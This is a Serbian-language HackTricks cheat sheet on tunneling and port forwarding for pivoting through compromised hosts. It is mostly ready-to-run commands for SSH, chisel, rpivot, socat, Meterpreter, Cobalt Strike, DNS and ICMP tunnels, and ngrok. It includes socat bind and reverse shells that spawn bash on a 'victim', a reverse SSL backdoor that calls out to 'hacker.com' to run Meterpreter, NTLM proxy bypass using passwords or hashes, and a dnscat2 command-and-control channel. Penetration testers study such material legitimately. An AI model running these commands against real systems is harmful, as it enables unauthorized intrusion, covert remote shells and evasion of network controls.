# Tunneling and Port Forwarding

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF-u**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova u** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Nmap savet

{% hint style="warning" %}
**ICMP** i **SYN** skenovi ne mogu biti tunelovani kroz socks proxy, stoga moramo **onemogućiti otkrivanje pinga** (`-Pn`) i specificirati **TCP skenove** (`-sT`) da bi ovo radilo.
{% endhint %}

## **Bash**

**Host -> Skok -> InterniA -> InterniB**

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

Grafička SSH veza (X)

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Lokalno preusmeravanje porta

Otvorite novi port na SSH serveru --> Drugi port

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Lokalni port --> Kompromitovani host (SSH) --> Treća\_kutija:Port

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Lokalni port --> Kompromitovani host (SSH) --> Gde god

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Obrnuto prosleđivanje porta

Ovo je korisno za dobijanje obrnutih ljuski sa internih domaćina preko DMZ-a do vašeg domaćina:

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunel

Potrebno je **root u oba uređaja** (jer ćete kreirati nove interfejse) i sshd konfiguracija mora dozvoliti root prijavljivanje:\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```

Omogućite prosleđivanje na serverskoj strani

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Postavite novu rutu na klijentskoj strani

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

## SSHUTTLE

Možete **tunelovati** sav **saobraćaj** ka **podmreži** preko hosta.\
Na primer, prosleđivanje sav saobraćaj koji ide ka 10.10.10.0/24

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Povežite se pomoću privatnog ključa

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

### Port2Port

Lokalni port --> Kompromitovani host (aktivna sesija) --> Treća\_kutija:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

SOCKS (Socket Secure) je protokol koji omogućava rutiranje mrežnog saobraćaja između klijenta i servera putem proxy servera. SOCKS koristi port 1080 i može biti korišćen za tuneliranje različitih vrsta mrežnog saobraćaja, uključujući TCP i UDP.

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Drugi način:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

### SOCKS proxy

Otvorite port u tim serveru koji sluša na svim interfejsima i može se koristiti za **usmeravanje saobraćaja kroz beacon**.

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

{% hint style="warning" %}
U ovom slučaju, **port je otvoren na hostu zastavici**, a ne na Tim Serveru i saobraćaj se šalje na Tim Server, a odatle ka naznačenom hostu:port
{% endhint %}

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

### rPort2Port lokalno

{% hint style="warning" %}
U ovom slučaju, **port je otvoren na hostu Beacon-a**, a ne na Team Server-u i **saobraćaj je poslat ka Cobalt Strike klijentu** (ne ka Team Server-u) i odatle ka naznačenom hostu:port.
{% endhint %}

```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Potrebno je da otpremite web fajl tunel: ashx|aspx|js|jsp|php|php|jsp

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Dizalica

Možete je preuzeti sa stranice sa izdanjima [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Potrebno je koristiti **istu verziju za klijenta i server**

### čarape

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Prosleđivanje porta

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Obrnuti tunel. Tunel se pokreće sa strane žrtve.\
Socks4 proxy je kreiran na 127.0.0.1:1080

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Prođite kroz **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Obrnuti shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port preko čarapa

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter putem SSL Socata

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Možete zaobići **neovlašćeni proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunel

**/bin/sh konzola**

Kreirajte sertifikate na obe strane: Klijentu i Serveru

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Udalljeni Port2Port

Povežite lokalni SSH port (22) sa 443 portom napadačkog hosta

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

To je kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).

Pošto će se ovaj binarni fajl izvršiti na žrtvi i to je ssh klijent, moramo otvoriti naš ssh servis i port kako bismo imali reverznu konekciju. Zatim, da bismo prosledili samo lokalno dostupan port na port našeg računara:

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Morate biti lokalni administrator (za bilo koji port)

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

## SocksOverRDP & Proxifier

Potrebno je da imate **RDP pristup sistemu**.\
Preuzmite:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) funkciju Remote Desktop Service opcije Windows-a. DVC je odgovoran za **tuneliranje paketa preko RDP veze**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na vašem klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** na sledeći način:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Sada možemo **povezati** se sa **žrtvom** preko **RDP** koristeći **`mstsc.exe`**, i trebali bismo dobiti **prozor** koji kaže da je **SocksOverRDP dodatak omogućen**, i da će **slušati** na **127.0.0.1:1080**.

**Povežite** se preko **RDP** i otpremite i izvršite na mašini žrtve binarni fajl `SocksOverRDP-Server.exe`:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Sada potvrdite na vašem računaru (napadaču) da li port 1080 osluškuje:

```
netstat -antb | findstr 1080
```

Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da biste usmjerili saobraćaj kroz taj port.**

## Proksifikuj Windows GUI aplikacije

Možete omogućiti Windows GUI aplikacijama da koriste proxy korišćenjem [**Proxifier**](https://www.proxifier.com/).\
U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
U **Profile -> Proxification Rules** dodajte ime programa za proksifikaciju i veze ka IP adresama koje želite da proksifikujete.

## NTLM zaobilaženje proxy-ja

Prethodno pomenuti alat: **Rpivot**\
**OpenVPN** takođe može da ga zaobiđe, podešavanjem ovih opcija u konfiguracionom fajlu:

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autentikuje se protiv proksi servera i vezuje lokalni port koji se prosleđuje ka spoljnoj usluzi koju odredite. Zatim, možete koristiti alat po vašem izboru preko ovog porta.\
Na primer, prosleđuje port 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Sada, ako postavite na primer na žrtvi **SSH** servis da sluša na portu 443. Možete se povezati na njega preko napadačevog porta 2222.\
Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443 dok napadač sluša na portu 2222.

## YARP

Obrnuti proxy kreiran od strane Microsoft-a. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Potreban je root na oba sistema da bi se kreirali tun adapteri i tunelovali podaci između njih korišćenjem DNS upita.

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Tunel će biti vrlo spor. Možete kreirati kompresovanu SSH konekciju kroz ovaj tunel korišćenjem:

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Preuzmite ga ovde**](https://github.com/iagox86/dnscat2)**.**

Uspostavlja C\&C kanal preko DNS-a. Ne zahteva root privilegije.

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **U PowerShell-u**

Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) da pokrenete dnscat2 klijenta u PowerShell-u:

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Prosleđivanje porta pomoću dnscat**

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Promena proxychains DNS

Proxychains presreće `gethostbyname` libc poziv i tuneliše tcp DNS zahtev kroz socks proxy. Podrazumevano, DNS server koji proxychains koristi je 4.2.2.2 (hardkodiran). Da biste ga promenili, izmenite fajl: _/usr/lib/proxychains3/proxyresolv_ i promenite IP adresu. Ako se nalazite u Windows okruženju, možete postaviti IP adresu kontrolera domena.

## Tuneli u Go-u

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunelovanje

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Potreban je root na oba sistema kako bi se kreirali tun adapteri i tunelovali podaci između njih koristeći ICMP echo zahteve.

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Preuzmite ga ovde**](https://github.com/utoni/ptunnel-ng.git).

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) **je alatka za izlaganje rešenja na internetu jednom komandom.** _URI za izlaganje su poput:_ **UID.ngrok.io**

### Instalacija

* Napravite nalog: https://ngrok.com/signup
* Preuzimanje klijenta:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Osnovne upotrebe

**Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Takođe je moguće dodati autentikaciju i TLS, ako je potrebno._

#### Tunelovanje TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Otkrivanje fajlova putem HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP poziva

_Koristan za XSS, SSRF, SSTI ..._ Direktno sa stdout-a ili preko HTTP interfejsa [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tuneliranje internih HTTP servisa

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Primer jednostavne konfiguracije ngrok.yaml

Otvora 3 tunela:

* 2 TCP
* 1 HTTP sa izlaganjem statičkih fajlova sa lokacije /tmp/httpbin/

```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```

## Ostali alati za proveru

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>
